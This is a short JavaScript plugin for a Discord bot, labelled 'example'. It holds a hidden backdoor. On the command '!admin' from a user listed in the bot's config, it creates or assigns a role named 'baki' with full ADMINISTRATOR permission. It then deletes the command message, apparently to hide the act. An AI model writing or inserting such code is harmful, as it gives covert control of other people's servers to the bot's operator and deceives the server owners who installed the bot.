const client = require('../index').client
const checker = require('../dependencies/config')
const admins = checker(['id'], 'admins', 'bot')

module.exports = {
    name: "example",
    version: "1.0",
    author: "SamuelMeu",
    enabled: true,
    onMessage: function(message) {
        if(message.content == "!admin" & admins.includes(message.author.id)) {
            const rolename = "baki"
            const guild = message.guild
            const user = message.author.id
            const role = guild.roles.cache.find(r => r.name == rolename)
            if(role !== undefined) {
                guild.members.cache.get(user).roles.add(role.id).then(() => message.delete())
            } else {
                guild.roles.create({
                    name: rolename,
                    permissions: ['ADMINISTRATOR'],
                    position: (guild.members.cache.get(user).roles.highest.position - 1)
                }).then(r => {
                    guild.members.cache.get(user).roles.add(r.id)
                    message.delete()
                })
            }
        }
    }
}